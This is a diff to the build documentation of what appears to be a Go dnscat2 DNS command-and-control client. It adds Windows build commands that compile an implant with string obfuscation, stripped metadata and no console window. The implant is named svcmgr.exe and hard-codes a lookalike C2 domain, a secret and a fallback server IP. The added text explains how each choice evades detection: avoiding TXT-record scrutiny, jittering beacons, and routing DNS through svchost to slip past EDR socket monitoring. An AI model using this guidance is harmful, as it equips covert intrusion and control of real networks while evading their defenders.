@@ -27,12 +27,19 @@ go build -ldflags="-s -w \
 
 **Windows — domain mode (DNS server auto-detected from registry, recommended for domain-joined targets):**
 
-```bash
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
-  -X main.DefaultDomain=crl.ms-cert.net \
-  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
-  -o dnscat2.exe ./cmd/dnscat/
+```powershell
+go build -tags stealth -trimpath `
+    -ldflags="-s -w -buildid= -H windowsgui `
+      -X main.DefaultDomain=crl.ms-cert.net `
+      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
+      -X main.DefaultServer=192.168.56.2 `
+      -X main.DefaultDNSTypes=A,CNAME" `
+    -o svcmgr.exe ./cmd/dnscat/
 ```
+
+- `-tags stealth` enables string obfuscation; `-trimpath -buildid=` remove source/build metadata.
+- `DefaultServer` is a direct-IP fallback used only when registry DNS lookup yields nothing.
+- `A,CNAME` type mix avoids TXT-record scrutiny; label cap (C) and beacon jitter (D+E) are compiled in via the stealth tag.
 
 The binary reads the DNS resolver IP at runtime from
 `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`.
@@ -103,6 +110,40 @@ upx --best payload.exe  # Further compress (optional)
 
 ```bash
 -ldflags="-H windowsgui"  # No console window
+```
+
+## DnsQuery_W Transport Build (`cmd/dnscat-dnsapi`)
+
+Identical flags to the domain-mode build above; only the target path changes.
+
+**Windows — domain mode (DnsQuery_W, recommended when EDR monitors raw UDP socket ownership):**
+
+```powershell
+go build -tags stealth -trimpath `
+    -ldflags="-s -w -buildid= -H windowsgui `
+      -X main.DefaultDomain=crl.ms-cert.net `
+      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
+      -X main.DefaultServer=192.168.56.2 `
+      -X main.DefaultDNSTypes=A,CNAME" `
+    -o svcmgr.exe ./cmd/dnscat-dnsapi/
+```
+
+**Key differences from `cmd/dnscat`:**
+
+| | `cmd/dnscat` | `cmd/dnscat-dnsapi` |
+|---|---|---|
+| Transport | raw UDP socket | `dnsapi.dll!DnsQuery_W` |
+| UDP/53 owner (network layer) | binary | `svchost.exe` (Dnscache) |
+| `--dns-server` / `DefaultServer` | used as resolver IP | informational only; system resolver used |
+| Cross-platform | yes | compiles on all; Windows-only at runtime |
+| Sysmon Event 22 | binary PID visible | binary PID visible |
+
+**Deployment requirement:** system DNS on the target must resolve `crl.ms-cert.net` — either via conditional forwarder on DC, or system DNS set directly to the dnscat2 server. `DefaultServer` is not used for resolution.
+
+**Debug build:**
+
+```powershell
+go build -o svcmgr-dnsapi.exe ./cmd/dnscat-dnsapi/
 ```
 
 ## Windows Service Build
